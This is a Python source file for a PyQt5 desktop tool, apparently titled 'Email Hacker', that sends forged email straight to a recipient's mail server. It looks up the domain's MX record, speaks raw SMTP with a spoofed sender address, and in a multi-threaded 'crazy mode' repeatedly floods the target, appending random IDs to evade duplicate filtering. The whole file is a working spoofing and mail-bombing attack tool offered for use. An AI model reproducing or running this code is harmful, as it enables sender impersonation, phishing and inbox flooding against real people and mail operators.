# -*- coding: utf-8 -*-
import os
import sys
import time
import string
import socket
import random
import threading
import subprocess
import dns.resolver
from PyQt5.QtGui import QIntValidator, QTextCursor
from PyQt5.QtCore import Qt, QObject, pyqtSignal, QEventLoop, QTimer
from PyQt5.QtWidgets import *

class FakeEmail:
    def __init__(self, to_addr, from_addr, SMTP_addr, port=25, timeout=10):
        Print(u"check config", sign=u"[+]")
        Print(u"to address: "+to_addr)
        Print(u"from address: "+from_addr)
        Print(u"SMTP address: "+SMTP_addr)
        Print(u"SMTP port: "+str(port))
        Print(u"socket timeout: "+str(timeout))
        Print(u"verbose level: "+str(verbose))
        Print(u"no problem, maybe", sign=u"  [*]")

        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addr = SMTP_addr
        self.quit_flag = 1
        self.succ_num = 0

    def Connect(self):
        time.sleep(random.random()*1.5)
        self.sk = socket.socket()
        self.sk.settimeout(self.timeout)

        try:
            Print(u"connect to %s:%s " % (self.SMTP_addr, str(self.port)), sign=u"[+]")
            self.sk.connect((self.SMTP_addr, self.port))
        except Exception as e:
            return (0, str(e))

        return self.Recv(check=u"220")

    def Send(self, msg):
        for result in msg.split(u"\r\n"):
            try:
                self.sk.sendall((result+u"\r\n").encode("utf8"))
                Print(result, threshold=2, color=u"yellow", sign=u"=> ")
            except Exception as e:
                Print(str(e), threshold=0, color=u"red", sign=u"=> ", id=self.id)
                return 0
        return 1

    def Recv(self, check=u"", threshold=2):
        try:
            data = [i.decode(u"utf8") for i in self.sk.recv(1024).split(b"\r\n") if i]
            assert data
        except AssertionError:
            if not check:
                Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ", id=self.id)
            return (0, u"recv empty answer")
        except Exception as e:
            if not check:
                Print(str(e), threshold=0, color=u"red", sign=u"<= ", id=self.id)

            return (0, str(e))

        if check and check not in data[-1]:
            return (0, data[-1])

        if any([i for i in range(400, 600) if data[-1][:3] == str(i)]):
            Print(data[-1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
            return (0, data[-1])

        for result in data:
            Print(result, threshold=threshold, color=u"green", sign=u"<= ")

        return (1, data[-1])

    def Attack(self, id):
        global succ_num, failed_num, quit_flag, threads_alive, Data

        self.id = id
        while quit_flag and self.quit_flag:
            check_connect = self.Connect()
            if not check_connect[0]:
                Print(u"creating connection failed: "+u"I just got the answer: '%s' from %s" % (check_connect[1], self.SMTP_addr),
                      threshold=0, color=u"red", sign=u"[X]", flag=0, id=self.id)
                self.sk.close()
                failed_num += 1
                if crazy_mode:
                    continue
                else:
                    break

            Print(u"now, all ready", sign=u"  [*]")
            Print(u"using spam attack", sign=u"[+]")
            if not (self.Send(u"ehlo antispam") and self.Recv()[0]):
                failed_num += 1
                if crazy_mode:
                    continue
                else:
                    break

            while quit_flag and self.quit_flag:
                if not (self.Send(u"mail from:<%s>" % self.from_addr) and self.Recv()[0]) or\
                        not (self.Send(u"rcpt to:<%s>" % self.to_addr) and self.Recv()[0]) or\
                        not (self.Send(u"data") and self.Recv()[0]):

                    failed_num += 1
                    if not crazy_mode:
                        self.quit_flag = 0
                    continue

                if self.Send(u"to: %s" % self.to_addr) and\
                        self.Send(u"from: %s" % self.from_addr) and\
                        self.Send("subject: "+subject) and\
                        self.Send(u"") and\
                        self.Send(body+"\r\n\r\nYour random id is "+"".join(random.choice(string.hexdigits) for i in range(32))+"\r\n."):

                    result = self.Recv(threshold=0, check=u"250")
                    if result[0]:
                        succ_num += 1
                        self.succ_num += 1
                        Data[id] = "cyan"
                    else:
                        Print(result[1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
                        failed_num += 1
                else:
                    failed_num += 1

                if not crazy_mode:
                    self.quit_flag = 0
                else:
                    time.sleep(random.random()*1.5)

        Print(u"all done", sign=u"  [*]")
        threads_alive[id] = 0
        return self.sk.close()

def superPrint():
    Lock.acquire()

    _, fixed_length = os.popen('stty size', 'r').read().split()
    fixed_length = int(fixed_length)
    length = 0
    for index in Indicator("attacking..."):
        for i, data in enumerate(Data):
            _, length = os.popen('stty size', 'r').read().split()
            length = int(length)
            if fixed_length > length:
                show_logo()
                fixed_length = length

            print("\r%s%s" % ("No.%d: " % i,
                  data if len(data) < length else data[:length-3]+"..."))

        print("\r[%d] %s" % (succ_num, index))
        print("[%dA" % (len(Data)+1))
        time.sleep(0.1)

    for i, data in enumerate(Data):
        print("\r%s%s" % ("No.%d: " % i,
              data if len(data) < length else data[:length-3]+"..."))
    if crazy_mode != 1:
        print("")
    Lock.release()


def Print(string, threshold=3, color=u"gray", sign=u"  [-]", flag=1, id=-1):
    global Data

    if verbose < threshold or (verbose == 0 and threshold > -1):
        if id != -1:
            Data[id] = string
        return

    str_color = u"gray" if color == u"gray" else u"white"
    string = sign + string
    if verbose > 2 and threshold < 3 and flag:
        string = "  [-]"+string

    if Lock.acquire():
        print("\r"+string)
        Lock.release()


def DNSQuery(to_addr):
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 3

    Print(u"query MX of DNS for %s" % to_addr, sign=u"[+]")

    try:
        SMTP_addr = b'.'.join(dns.resolver.query(
            to_addr[to_addr.find(u"@")+1:], u'MX')[0].exchange.labels).decode(u"utf8")
        assert SMTP_addr != u""
    except Exception as e:
        Print(u"query MX of %s failed: " % to_addr + str(e),
              threshold=0, color=u"red", sign=u"[X]", flag=0)
        return 0

    Print(u"success", sign=u"  [*]")
    return SMTP_addr


def Launcher():
    if not verbose:
        threading.Thread(target=superPrint).start()

    threads = []
    for id in range(threads_num):
        client = FakeEmail(to_addr, from_addr, SMTP_addr=SMTP_addr)
        t = threading.Thread(target=client.Attack, args=(id,))
        t.start()
        threads.append(t)

    if not crazy_mode:
        for t in threads:
            t.join()
    else:
        for i in Indicator("attacking..."):
            Print(i, color="green", threshold=0, flag=0, sign="[%d]" % succ_num)
            time.sleep(0.1)


def Indicator(string, index=0):
    while any(threads_alive) and ver == "go" and print_flag:
        index = (index+1) % len(string)
        yield string[:index]+string[index].upper()+string[index+1:]


def quit(signum, frame):
    global quit_flag, print_flag

    print_flag = 0
    Lock.acquire()
    Lock.release()
    print_flag = 1
    quit_flag = 0
    for i in Indicator("stopping..."):
        Print(i, color="yellow", threshold=-1, flag=0, sign="[!]")
        time.sleep(0.1)

    Print(u"%s %s" % (u"success:", succ_num), threshold=-1,
          color=u"green", flag=0, sign="\n"*(crazy_mode == True)+"\n[*]")
    Print(u"%s %s\n" % (u"failed:", failed_num), threshold=-1, color=u"red", flag=0, sign="[!]")

    print(random.choice([
        u"Goodbye", u"Have a nice day", u"See you later",
        u"Farewell", u"Cheerio", u"Bye",
    ])+" :)")
    #sys.exit()

def show_logo():
    print("""
 ███████╗     ██╗  ██╗
 ██╔════╝     ██║  ██║Tr0y
 █████╗       ███████║
 ██╔══╝       ██╔══██║v2.1
 ███████╗     ██║  ██║
 ╚══════╝mail ╚═╝  ╚═╝acker
""")

class Stream(QObject):
    """ redirect console output to text widget """
    new_text = pyqtSignal(str)

    def write(self, text):
        self.new_text.emit(str(text))


class EmailHackerWidget(QWidget):
    def __init__(self):
        super(EmailHackerWidget, self).__init__()
        self.InitUI()
        self.resize(800, 600)
        self.show()
        
        # custom output stream
        sys.stdout = Stream(new_text=self.UpdateOutputText)

    def UpdateOutputText(self, text):
        """ write console output to text widget """
        cursor = self.process.textCursor()
        cursor.movePosition(QTextCursor.End)
        if isinstance(text, bytes):
            text = text.decode()
        cursor.insertText(text)
        self.process.setTextCursor(cursor)
        self.process.ensureCursorVisible()

    def CloseStream(self, event):
        sys.stdout = sys.__stdout__
        super().closeEvent(event)

    def InitUI(self):
        self.setWindowTitle("Email Hacker")

        grid = QGridLayout()
        self.setLayout(grid)

        items = ['From Address', 
                 'To Address',
                 'Email Subject',
                 'Thread Num',
                 'Verbose',
                 'Crazy Mode',
                 'Body',
                 'Output',
                 'Send']

        self.text_objs = {}
        self.v_group = QButtonGroup(self)
        self.c_group = QButtonGroup(self)
        hight = 0
        for name in items:
            if name == 'Send':
                send_btn = QPushButton(name, self)
                send_btn.clicked.connect(self.Run)
                grid.addWidget(send_btn, hight, 3, 1, 2)
                hight += 1
            elif name == 'Body':
                text = QTextEdit(self)
                self.text_objs[name] = text
                grid.addWidget(text, hight, 0, 3, 5)
                hight += 3
            elif name == 'Output':
                self.process = QTextEdit(self, readOnly=True)
                self.process.ensureCursorVisible()
                self.process.setLineWrapColumnOrWidth(300)
                self.process.setLineWrapMode(QTextEdit.FixedPixelWidth)
                grid.addWidget(self.process, hight, 0, 1, 5)
                hight += 1
            elif name == 'Verbose':
                label = QLabel(name + ': ', self)
                label.setAlignment(Qt.AlignRight)
                grid.addWidget(label, hight, 0, 1, 1)
                for rank in range(4):
                    rb = QRadioButton(str(rank), self)
                    if rank == 0:
                        rb.setChecked(True)
                    self.v_group.addButton(rb, rank)
                    position = rank + 1
                    grid.addWidget(rb, hight, position, 1, 1)
                hight += 1
            elif name == 'Crazy Mode':
                label = QLabel(name + ': ', self)
                label.setAlignment(Qt.AlignRight)
                grid.addWidget(label, hight, 0, 1, 1)
                for i in range(2):
                    rb = QRadioButton(['False', 'True'][i], self)
                    if i == 0: # set default value
                        rb.setChecked(True)
                    self.c_group.addButton(rb, i)
                    position = 2 * i + 1
                    grid.addWidget(rb, hight, position, 1, 2)
                hight += 1
            else:
                label = QLabel(name + ': ', self)
                label.setAlignment(Qt.AlignRight)
                line = QLineEdit(self)
                if name == 'Thread Num':
                    line.setValidator(QIntValidator())
                self.text_objs[name] = line
                grid.addWidget(label, hight, 0, 1, 1)
                grid.addWidget(line, hight, 1, 1, 4)
                hight += 1
            
    def GetAttrs(self):
        Attrs = {}
        for name, obj in self.text_objs.items():
            text = None
            if isinstance(obj, QTextEdit):
                text = obj.toPlainText()
            elif isinstance(obj, QLineEdit):
                text = obj.text()
            else:
                raise ValueError('type<%s> is not support' % type(obj))
            if not text:
                QMessageBox.information(self, 'Information',
                                        '"%s" has not been set, pls check your config' % name)
                return

            if name == 'Thread Num':
                tnum = int(text)
                if tnum <= 0:
                    QMessageBox.information(self, 'Information',
                                            'Thread Num must bigger than zero')
                    return
                Attrs[name] = tnum
            else:
                Attrs[name] = text
        
        Attrs['Verbose'] = self.v_group.checkedId()
        Attrs['Crazy Mode'] = self.c_group.checkedId()

        return Attrs
            
    def Run(self):
        items = ['From Address', 
                 'To Address',
                 'Email Subject',
                 'Thread Num',
                 'Verbose',
                 'Crazy Mode',
                 'Body']
        Attrs = self.GetAttrs()
        for item in items:
            if item not in Attrs:
                return
        
        InitVars(Attrs)
        if SMTP_addr:
            ver = "go"
            Launcher()
        else:
            threads_alive = [0]
        quit(0, 0)
        #loop = QEventLoop()
        #QTimer.singleShot(1000, loop.quit)

def InitVars(Attrs):
    global from_addr
    global to_addr
    global subject
    global body
    global threads_num
    global verbose 
    global crazy_mode 
    global succ_num
    global failed_num 
    global quit_flag
    global print_flag 
    global ver
    global threads_alive
    global Data
    global Lock 
    global SMTP_addr

    from_addr = Attrs.get('From Address')
    to_addr = Attrs.get('To Address')
    subject = Attrs.get('Email Subject')
    body = Attrs.get('Body')
    threads_num = Attrs.get('Thread Num')
    verbose = Attrs.get('Verbose')
    crazy_mode = Attrs.get('Crazy Mode')

    succ_num = failed_num = 0
    quit_flag = print_flag = 1
    ver = -1
    
    threads_alive = [1] * threads_num
    Data = ['0'] * threads_num
    Lock = threading.Lock()

    if verbose == -1:
        verbose = 0 if crazy_mode else 2 if threads_num == 1 else 1
    elif threads_num > 1:
        if crazy_mode and verbose > 1:
            ver = 0
            Print(u"""...It's not recommended to enable so many output(let verbose>0)
...in the multi-threaded mode with crazy mode,
...change it to 0? (let verbose=0)""",
                  color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)
        elif verbose > 1:
            ver = 1
            Print(u"""...It's not recommended to enable so many output(let verbose>1)
...in the multi-threaded mode,
...change it to 1? (let verbose=1)""",
                  color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)

    if ver != -1:
        if vars(__builtins__).get('raw_input', input)(u"[!]"+"type [yes]/no: ") != "no":
            verbose = ver
            Print(u"as you wish\n", color=u"green", threshold=0, sign=u"[*]", flag=0)
        else:
            Print(u"in a mess, of course\n", color=u"yellow", threshold=0, sign=u"[!]", flag=0)

    SMTP_addr = DNSQuery(to_addr)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.aboutToQuit.connect(app.deleteLater)
    w = EmailHackerWidget()
    sys.exit(app.exec_())
